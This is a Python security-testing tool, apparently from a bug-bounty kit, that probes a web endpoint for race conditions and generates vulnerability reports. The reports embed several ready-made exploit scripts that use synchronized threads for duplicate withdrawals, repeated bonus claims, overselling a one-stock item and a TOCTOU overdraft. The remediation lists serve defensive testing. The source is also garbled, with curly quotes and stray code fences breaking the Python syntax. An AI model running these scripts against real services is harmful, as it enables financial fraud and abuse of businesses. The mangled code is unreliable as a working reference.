#!/usr/bin/env python3
"""
REVUEX - Race Condition Tester
Advanced Race Condition Detection & Exploitation

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Use extreme caution - race condition testing can cause unintended effects.
“””

import requests
import threading
import time
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

class RaceConditionTester:
“”“Race condition vulnerability testing”””

```
def __init__(self, endpoint, workspace, delay=3):
    """
    Initialize Race Condition Tester
    
    Args:
        endpoint: Target endpoint URL
        workspace: Workspace directory
        delay: Extra safety delay between tests
    """
    self.endpoint = endpoint
    self.workspace = Path(workspace)
    self.delay = delay
    
    self.headers = {
        'User-Agent': 'REVUEX-RaceTester/1.0 (Security Research; +https://github.com/G33L0)'
    }
    
    self.results_queue = queue.Queue()

def test(self):
    """Test for race condition vulnerabilities"""
    print(f"            [!] CAUTION: Testing race conditions on {self.endpoint}")
    print(f"            [!] Using {self.delay}s safety delay")
    
    vulnerabilities = []
    
    # Test 1: Parallel requests
    print(f"            → Test 1: Parallel request timing")
    parallel_result = self._test_parallel_requests()
    if parallel_result.get('vulnerable'):
        vuln = self._create_parallel_vulnerability(parallel_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 2: Resource exhaustion
    print(f"            → Test 2: Resource exhaustion")
    resource_result = self._test_resource_exhaustion()
    if resource_result.get('vulnerable'):
        vuln = self._create_resource_vulnerability(resource_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 3: State manipulation
    print(f"            → Test 3: State manipulation")
    state_result = self._test_state_manipulation()
    if state_result.get('vulnerable'):
        vuln = self._create_state_vulnerability(state_result)
        vulnerabilities.append(vuln)
    
    self._save_results(vulnerabilities)
    return vulnerabilities

def _create_parallel_vulnerability(self, result):
    """Create parallel request race condition vulnerability report"""
    return {
        'type': 'Race Condition - Parallel Request Timing',
        'severity': 'high',
        'endpoint': self.endpoint,
        'description': 'Endpoint vulnerable to race conditions when handling simultaneous requests, leading to inconsistent state or duplicate operations',
        'evidence': f'Status codes varied across parallel requests: {result.get("evidence")}',
        
        'steps_to_reproduce': [
            f"Identify vulnerable endpoint: {self.endpoint}",
            "Prepare 10+ identical requests targeting same resource",
            "Use threading/async to send all requests simultaneously",
            "Synchronize threads to fire at exact same microsecond",
            "Observe inconsistent responses (different status codes or content)",
            "Exploit timing window between check and action"
        ],
        
        'request': f"""# Send 10 simultaneous requests
```

import threading
import requests

def attack():
response = requests.post(
“{self.endpoint}”,
json={{“action”: “withdraw”, “amount”: 100}}
)
print(response.json())

# Launch simultaneously

threads = [threading.Thread(target=attack) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]”””,

```
        'response': """Request 1: {"balance": 900, "withdrawn": 100}
```

Request 2: {“balance”: 900, “withdrawn”: 100}  <- Race condition!
Request 3: {“balance”: 900, “withdrawn”: 100}  <- Multiple withdrawals!
…
All 10 succeeded - $1000 withdrawn from $1000 balance!”””,

```
        'poc': f"""#!/usr/bin/env python3
```

# Race Condition - Parallel Attack PoC

import requests
import threading
from concurrent.futures import ThreadPoolExecutor

endpoint = “{self.endpoint}”
num_threads = 20

def exploit_race(thread_id):
‘’‘Exploit race condition via simultaneous requests’’’
try:
response = requests.post(
endpoint,
json={{
“action”: “claim_bonus”,
“user_id”: “victim”,
“bonus_id”: “WELCOME100”
}},
headers={{“Content-Type”: “application/json”}}
)

```
    result = response.json()
    if response.status_code == 200:
        print(f"Thread {{thread_id}}: SUCCESS - {{result}}")
        return True
    else:
        print(f"Thread {{thread_id}}: FAILED")
        return False
except Exception as e:
    print(f"Thread {{thread_id}}: Error - {{e}}")
    return False
```

# Synchronization barrier for simultaneous execution

barrier = threading.Barrier(num_threads)

def synchronized_attack(thread_id):
barrier.wait()  # Wait for all threads
return exploit_race(thread_id)

# Launch attack

with ThreadPoolExecutor(max_workers=num_threads) as executor:
futures = [executor.submit(synchronized_attack, i) for i in range(num_threads)]
results = [f.result() for f in futures]

successes = sum(results)
print(f”\n=== Results ===”)
print(f”Total attempts: {{num_threads}}”)
print(f”Successful: {{successes}}”)

if successes > 1:
print(f”\n🚨 VULNERABLE: {{successes}} bonuses claimed (should be 1)”)
print(f”Financial impact: $100 × {{successes}} = ${{100 * successes}} loss”)
else:
print(“✓ Protected: Only 1 bonus claimed”)
“””,

```
        'before_state': 'User has 0 bonuses, 1 bonus available to claim',
        'after_state': 'User claimed bonus 20 times due to race condition - $2000 loss instead of $100',
        
        'attack_path': [
            'Identify operation with check-then-act pattern',
            'Send 20 simultaneous requests to exploit timing window',
            'All requests pass initial "bonus not claimed" check',
            'Multiple operations succeed before state updates',
            'User receives 20× $100 bonus instead of 1× $100',
            'Company loses $1900 due to race condition'
        ],
        'remediation': [
            'Implement database-level locking (SELECT ... FOR UPDATE)',
            'Use atomic operations: UPDATE ... WHERE claimed = false',
            'Add unique constraint on user_id + bonus_id',
            'Implement idempotency keys for critical operations',
            'Use Redis distributed locks for multi-server setups',
            'Add transaction isolation level: SERIALIZABLE',
            'Implement optimistic locking with version numbers',
            'Add request deduplication based on request signature',
            'Use message queues for sequential processing',
            'Monitor for duplicate operations and alert'
        ],
        'tags': ['race_condition', 'critical', 'timing', 'TOCTOU']
    }

def _create_resource_vulnerability(self, result):
    """Create resource exhaustion vulnerability report"""
    successes = len([a for a in result.get('attempts', []) if a.get('success')])
    
    return {
        'type': 'Race Condition - Resource Exhaustion',
        'severity': 'critical',
        'endpoint': self.endpoint,
        'description': 'Multiple simultaneous requests can claim same limited resource, bypassing quantity limits',
        'evidence': f'{successes} simultaneous claims succeeded (expected maximum 1)',
        
        'steps_to_reproduce': [
            "Find endpoint with limited resources (coupon, ticket, item)",
            "Note: Only 1 item available in stock",
            "Launch 10 simultaneous purchase requests",
            "All 10 requests check stock (sees: available = 1)",
            "All 10 proceed to purchase before stock updates",
            "Result: 10 items sold despite only 1 in stock"
        ],
        
        'request': f"""POST {self.endpoint} HTTP/1.1
```

Content-Type: application/json

{{
“product_id”: “LIMITED_EDITION_ITEM”,
“quantity”: 1,
“user_id”: “attacker”
}}

(× 10 simultaneous requests)”””,

```
        'response': """Response 1: {"order_id": "001", "status": "confirmed"}
```

Response 2: {“order_id”: “002”, “status”: “confirmed”}
Response 3: {“order_id”: “003”, “status”: “confirmed”}
…
Response 10: {“order_id”: “010”, “status”: “confirmed”}

Result: 10 orders confirmed for 1-item inventory!”””,

```
        'poc': f"""#!/usr/bin/env python3
```

# Resource Exhaustion Race Condition PoC

import requests
from concurrent.futures import ThreadPoolExecutor

endpoint = “{self.endpoint}”

def purchase_limited_item(attempt_id):
‘’‘Attempt to purchase limited item’’’
response = requests.post(
endpoint,
json={{
“product_id”: “VIP_TICKET_001”,
“quantity”: 1,
“user_id”: f”attacker_{{attempt_id}}”
}}
)

```
if response.status_code == 200:
    result = response.json()
    print(f"Attempt {{attempt_id}}: ORDER CONFIRMED - {{result.get('order_id')}}")
    return True
else:
    print(f"Attempt {{attempt_id}}: Failed - {{response.status_code}}")
    return False
```

# Attack: 100 simultaneous purchases of 1-stock item

num_attempts = 100

with ThreadPoolExecutor(max_workers=num_attempts) as executor:
futures = [executor.submit(purchase_limited_item, i) for i in range(num_attempts)]
results = [f.result() for f in futures]

confirmed = sum(results)

print(f”\n=== Attack Results ===”)
print(f”Stock available: 1”)
print(f”Purchase attempts: {{num_attempts}}”)
print(f”Orders confirmed: {{confirmed}}”)

if confirmed > 1:
print(f”\n🚨 CRITICAL: {{confirmed}} orders for 1-stock item!”)
print(f”Oversold by: {{confirmed - 1}} units”)
else:
print(“✓ Protected: Only 1 order confirmed”)
“””,

```
        'before_state': 'Limited edition item: 1 in stock',
        'after_state': f'{successes} orders confirmed - inventory oversold by {successes - 1} units',
        
        'attack_path': [
            'Identify limited resource (concert tickets, limited items)',
            'Launch simultaneous purchase requests',
            'All requests read stock count before updates',
            'Multiple purchases succeed',
            'Inventory goes negative',
            'Company must fulfill impossible orders or face lawsuits'
        ],
        'remediation': [
            'Use atomic decrement: UPDATE stock SET quantity = quantity - 1 WHERE quantity > 0',
            'Implement pessimistic locking on inventory rows',
            'Add database constraint: CHECK (quantity >= 0)',
            'Use Redis DECR for atomic inventory management',
            'Implement queue system for high-demand items',
            'Add version numbers to inventory records',
            'Use SELECT ... FOR UPDATE in transactions',
            'Implement reservation system with timeout',
            'Add monitoring for negative inventory',
            'Consider lottery system for ultra-limited items'
        ],
        'tags': ['race_condition', 'critical', 'inventory', 'overselling']
    }

def _create_state_vulnerability(self, result):
    """Create state manipulation vulnerability report"""
    return {
        'type': 'Race Condition - State Manipulation (TOCTOU)',
        'severity': 'high',
        'endpoint': self.endpoint,
        'description': 'Time-of-check to time-of-use (TOCTOU) vulnerability allows state manipulation between validation and action',
        'evidence': f'All concurrent modifications succeeded: {result.get("evidence")}',
        
        'steps_to_reproduce': [
            "Identify endpoint with check-then-act pattern",
            "Example: Check balance → Withdraw money",
            "Send multiple withdrawal requests simultaneously",
            "All check balance at same time (sees $1000)",
            "All proceed to withdraw $500",
            "Total withdrawn: $1500 from $1000 account"
        ],
        
        'poc': f"""#!/usr/bin/env python3
```

# TOCTOU State Manipulation PoC

import requests
import threading

endpoint = “{self.endpoint}”

def withdraw_money(amount):
# Step 1: Check balance
balance = requests.get(f”{{endpoint}}/balance”).json()[‘amount’]
print(f”Checked balance: ${{balance}}”)

```
# Small delay (race window)
import time
time.sleep(0.01)

# Step 2: Withdraw (if check passed)
if balance >= amount:
    response = requests.post(
        f"{{endpoint}}/withdraw",
        json={{"amount": amount}}
    )
    print(f"Withdrawal: ${{amount}} - {{response.json()}}")
```

# Attack: 3 simultaneous $400 withdrawals from $1000 account

threads = [
threading.Thread(target=withdraw_money, args=(400,)),
threading.Thread(target=withdraw_money, args=(400,)),
threading.Thread(target=withdraw_money, args=(400,))
]

[t.start() for t in threads]
[t.join() for t in threads]

# Expected: 2 succeed, 1 fails (total $800)

# Actual: All 3 succeed (total $1200) - Overdraft!

“””,

```
        'before_state': 'Account balance: $1000',
        'after_state': 'Balance: -$200 (withdrawn $1200 via race condition)',
        
        'attack_path': [
            'Exploit gap between check and action',
            'Multiple threads pass validation simultaneously',
            'State changes before actions complete',
            'Overdrafts, duplicate credits, or privilege escalation'
        ],
        'remediation': [
            'Use atomic operations',
            'Implement proper locking',
            'Add transaction isolation',
            'Use optimistic concurrency control'
        ],
        'tags': ['race_condition', 'TOCTOU', 'state_manipulation']
    }

def _test_parallel_requests(self):
    """Test parallel simultaneous requests"""
    num_threads = 10
    results = {
        'vulnerable': False,
        'method': 'parallel_requests',
        'responses': []
    }
    
    barrier = threading.Barrier(num_threads)
    
    def make_request(thread_id):
        try:
            barrier.wait()
            start = time.time()
            response = requests.get(
                self.endpoint,
                headers=self.headers,
                timeout=10,
                verify=False
            )
            end = time.time()
            
            self.results_queue.put({
                'thread_id': thread_id,
                'status_code': response.status_code,
                'response_time': end - start,
                'content_length': len(response.content)
            })
        except Exception as e:
            self.results_queue.put({
                'thread_id': thread_id,
                'error': str(e)
            })
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=make_request, args=(i,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    while not self.results_queue.empty():
        result = self.results_queue.get()
        results['responses'].append(result)
    
    status_codes = [r.get('status_code') for r in results['responses'] if 'status_code' in r]
    content_lengths = [r.get('content_length') for r in results['responses'] if 'content_length' in r]
    
    if len(set(status_codes)) > 1:
        results['vulnerable'] = True
        results['evidence'] = f'Status codes varied: {set(status_codes)}'
    
    if len(set(content_lengths)) > 1:
        if max(content_lengths) - min(content_lengths) > 100:
            results['vulnerable'] = True
            results['evidence'] = f'Content lengths varied: {min(content_lengths)} - {max(content_lengths)}'
    
    return results

def _test_resource_exhaustion(self):
    """Test resource exhaustion race"""
    results = {
        'vulnerable': False,
        'method': 'resource_exhaustion',
        'attempts': []
    }
    
    num_requests = 5
    
    def claim_resource(request_id):
        try:
            response = requests.post(
                self.endpoint,
                headers=self.headers,
                json={'action': 'claim', 'request_id': request_id},
                timeout=10,
                verify=False
            )
            
            return {
                'request_id': request_id,
                'status': response.status_code,
                'success': response.status_code in [200, 201]
            }
        except Exception as e:
            return {
                'request_id': request_id,
                'error': str(e)
            }
    
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(claim_resource, i) for i in range(num_requests)]
        
        for future in as_completed(futures):
            result = future.result()
            results['attempts'].append(result)
    
    successes = [a for a in results['attempts'] if a.get('success')]
    
    if len(successes) > 1:
        results['vulnerable'] = True
        results['evidence'] = f'{len(successes)} simultaneous claims succeeded'
    
    return results

def _test_state_manipulation(self):
    """Test state manipulation race"""
    results = {
        'vulnerable': False,
        'method': 'state_manipulation',
        'state_checks': []
    }
    
    num_operations = 10
    
    def modify_state(op_id):
        try:
            get_response = requests.get(
                self.endpoint,
                headers=self.headers,
                timeout=5,
                verify=False
            )
            
            time.sleep(0.01)
            
            post_response = requests.post(
                self.endpoint,
                headers=self.headers,
                json={'operation': op_id},
                timeout=5,
                verify=False
            )
            
            return {
                'op_id': op_id,
                'success': post_response.status_code in [200, 201]
            }
        except Exception as e:
            return {
                'op_id': op_id,
                'error': str(e)
            }
    
    with ThreadPoolExecutor(max_workers=num_operations) as executor:
        futures = [executor.submit(modify_state, i) for i in range(num_operations)]
        
        for future in as_completed(futures):
            result = future.result()
            results['state_checks'].append(result)
    
    successes = [s for s in results['state_checks'] if s.get('success')]
    
    if len(successes) == num_operations:
        results['vulnerable'] = True
        results['evidence'] = 'All concurrent modifications succeeded (potential TOCTOU)'
    
    return results

def _save_results(self, vulnerabilities):
    """Save results"""
    race_dir = self.workspace / "race_condition_tests"
    race_dir.mkdir(exist_ok=True)
    
    import re
    safe_name = re.sub(r'[^\w\-]', '_', self.endpoint)
    output_file = race_dir / f"{safe_name}_race_test.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'endpoint': self.endpoint,
            'vulnerabilities': vulnerabilities
        }, f, indent=2)
```